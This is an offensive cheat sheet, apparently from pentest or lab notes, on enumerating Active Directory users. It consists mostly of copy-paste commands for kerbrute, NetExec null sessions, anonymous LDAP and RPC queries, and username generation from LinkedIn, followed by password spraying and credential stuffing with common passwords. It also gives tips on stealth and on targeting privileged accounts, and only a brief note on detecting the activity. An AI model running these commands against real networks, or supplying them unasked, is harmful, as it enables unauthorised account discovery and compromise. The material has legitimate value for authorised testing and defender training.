# Active Directory User Enumeration

Enumerate domain users to build target lists for password spraying and identify high-value accounts.
User enumeration is a critical first step in AD attacks, providing usernames for authentication attempts and identifying privileged accounts.

## Quick Reference

```bash
# Kerbrute user enumeration
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# NetExec SMB user enumeration
nxc smb 10.10.10.10 -u '' -p '' --users

# LDAP anonymous bind
ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" sAMAccountName | grep sAMAccountName
```

## Kerbrute User Enumeration

```bash
# Basic user enumeration
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Save valid users to file
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# With verbose output
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Multiple domain controllers
kerbrute userenum -d domain.local --dc 10.10.10.10,10.10.10.11 users.txt
```

## NetExec User Enumeration

```bash
# Enumerate users (null session)
nxc smb 10.10.10.10 -u '' -p '' --users

# With credentials
nxc smb 10.10.10.10 -u username -p password --users

# Clean output
nxc smb 10.10.10.10 -u '' -p '' --users | awk '{print $5}' > users.txt

# Remove domain prefix
cat users.txt | cut -d '\' -f 2 > users_clean.txt
```

## LDAP Enumeration

### Anonymous LDAP Bind

```bash
# Get naming context
ldapsearch -h 10.10.10.10 -x -s base namingcontexts

# Enumerate all users
ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Enumerate people
ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" -s sub "(&(objectclass=people))" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Get user details
ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" sAMAccountName userPrincipalName description
```

### Windapsearch

```bash
# Enumerate users (anonymous)
windapsearch --dc-ip 10.10.10.10 -u "" -U

# With credentials
windapsearch --dc-ip 10.10.10.10 -u username -p password -U

# Get detailed user info
windapsearch --dc-ip 10.10.10.10 -u username -p password --da

# Export to file
windapsearch --dc-ip 10.10.10.10 -u "" -U > users.txt
```

## RPC Enumeration

```bash
# Connect with null session
rpcclient -U "" -N 10.10.10.10

# Enumerate domain users
rpcclient $> enumdomusers

# Query domain info
rpcclient $> querydominfo

# Get password policy
rpcclient $> getdompwinfo

# Query specific user
rpcclient $> queryuser 0x457
```

## Enum4linux

```bash
# Full enumeration
enum4linux -a 10.10.10.10

# User enumeration only
enum4linux -U 10.10.10.10

# Clean output
enum4linux -U 10.10.10.10 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

## Username Generation from OSINT

### Username-Anarchy

```bash
# Generate username formats
username-anarchy -i names.txt > usernames.txt

# Common formats generated:
# john.smith
# jsmith
# smithj
# j.smith
# john_smith
```

### LinkedIn2Username

```bash
# Generate usernames from LinkedIn
python3 linkedin2username.py company_name

# With custom format
python3 linkedin2username.py company_name -f '{first}.{last}'
```

## Validating Users

### With Kerbrute

```bash
# Validate generated usernames
kerbrute userenum -d domain.local --dc 10.10.10.10 generated_users.txt -o valid_users.txt
```

### With NetExec

```bash
# Test usernames with common password
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success | grep '[+]'

# Credential stuffing
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

## Common Workflows

### Workflow 1: Anonymous Enumeration

```bash
# Step 1: Try LDAP anonymous bind
ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Step 2: If LDAP fails, try SMB null session
nxc smb 10.10.10.10 -u '' -p '' --users | awk '{print $5}' | cut -d '\' -f 2 > users.txt

# Step 3: If both fail, try RPC
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
```

### Workflow 2: OSINT-Based Enumeration

```bash
# Step 1: Gather names from OSINT (LinkedIn, company website)
# Save to names.txt (format: John Smith)

# Step 2: Generate username formats
username-anarchy -i names.txt > usernames.txt

# Step 3: Validate with Kerbrute
kerbrute userenum -d domain.local --dc 10.10.10.10 usernames.txt -o valid_users.txt

# Step 4: Test for weak passwords
nxc smb 10.10.10.10 -u valid_users.txt -p 'Welcome1!' --continue-on-success
```

## Notes

**Kerbrute Advantages:**

- Fast (can test 48,000+ usernames in seconds)
- Uses Kerberos pre-authentication
- Less noisy than SMB/LDAP
- No account lockout risk
- Works without credentials

**Detection:**

Kerbrute generates Event ID 4768 (Kerberos TGT requested):
- Enable Kerberos event logging via Group Policy
- Monitor for influx of 4768 events
- Look for failed pre-authentication attempts
- Unusual source IPs requesting TGTs

**Common Username Formats:**

- firstname.lastname (john.smith)
- firstinitiallastname (jsmith)
- lastnamefirstinitial (smithj)
- firstname_lastname (john_smith)
- firstname (john)
- lastname (smith)

**LDAP Anonymous Bind:**

Allows unauthenticated queries to LDAP:
- Often misconfigured
- Can enumerate users, groups, computers
- Should be disabled in secure environments

**Null Session Enumeration:**

SMB null sessions allow anonymous access:
- Legacy feature for backward compatibility
- Often disabled on modern systems
- Can enumerate users, shares, policies

**Best Practices:**

1. Start with anonymous methods (LDAP, SMB null)
2. Use Kerbrute for validation (fast and stealthy)
3. Generate usernames from OSINT if anonymous fails
4. Test common username formats
5. Document all discovered users
6. Identify high-value accounts (admin, service accounts)

**High-Value Accounts to Look For:**

- Domain Admins
- Enterprise Admins
- Service accounts (SQL, Exchange, etc.)
- Accounts with SPNs (Kerberoastable)
- Accounts with adminCount=1
- Accounts with password never expires
- Accounts with pre-auth disabled (ASREP roastable)

**Tools Comparison:**

- **Kerbrute**: Fastest, most stealthy, Kerberos-based
- **NetExec**: Multi-protocol, good for authenticated enum
- **LDAP**: Most detailed info, requires anonymous bind
- **RPC**: Legacy, often works when others fail
- **Enum4linux**: All-in-one, noisy but comprehensive

**Filtering Results:**

```bash
# Remove machine accounts (ending with $)
grep -v '\$' users.txt > users_no_machines.txt

# Remove guest account
grep -v -i 'guest' users.txt > users_no_guest.txt

# Remove disabled accounts (requires LDAP)
ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" "(&(objectclass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName
```

**Common Ports Used:**

| Tool | Ports |
|------|-------|
| Kerbrute | 88/TCP (Kerberos) |
| LDAP | 389/TCP, 636/TCP (LDAPS) |
| SMB | 445/TCP, 139/TCP |
| RPC | 135/TCP, 49152-65535/TCP |
| NetBIOS | 137/UDP, 138/UDP |
